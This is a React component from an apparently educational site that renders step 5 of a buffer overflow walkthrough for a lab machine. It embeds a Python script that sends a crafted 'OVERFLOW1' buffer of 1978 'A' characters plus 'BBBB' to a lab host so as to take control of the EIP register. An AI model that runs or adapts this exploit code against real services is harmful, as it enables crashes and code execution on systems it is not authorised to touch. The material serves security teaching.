import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const BufferOverflowStep5 = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography>
              Create a{" "}
              <Typography display="inline" className="highlight">
                3-overwrittingEIP.py
              </Typography>{" "}
              script by copying 2-offset.py and changing the{" "}
              <Typography display="inline" className="highlight">
                offset
              </Typography>{" "}
              variable to the offset found from Step 4. Also change the{" "}
              <Typography display="inline" className="highlight">
                payload
              </Typography>{" "}
              variable to an empty string. Also set the{" "}
              <Typography display="inline" className="highlight">
                retn
              </Typography>{" "}
              varaible to "BBBB". When we run the program, the{" "}
              <Typography display="inline" className="highlight">
                EIP
              </Typography>{" "}
              register should be filled with "BBBB" (42424242).
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"import socket\n\n" +
                'ip = "10.10.189.218"\n' +
                "port = 1337\n\n" +
                'prefix = "OVERFLOW1 "\n\n' +
                "offset = 1978\n" +
                'overflow = "A" * offset\n' +
                'retn = "BBBB"\n' +
                'padding = ""\n' +
                'payload = ""\n' +
                'postfix = ""\n\n' +
                "buffer = prefix + overflow + retn + padding + payload + postfix\n\n" +
                "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n" +
                "try:\n" +
                "  s.connect((ip, port))\n" +
                '  print("Sending evil buffer...")\n' +
                '  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n' +
                '  print("Done!")\n' +
                "except:\n" +
                '  print("Could not connect.")'}
            </SyntaxHighlighter>
            <Typography>
              If (42424242) is in the EIP register, then this means we now know
              the exact offset of the EIP register and essentially control it.
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default BufferOverflowStep5;
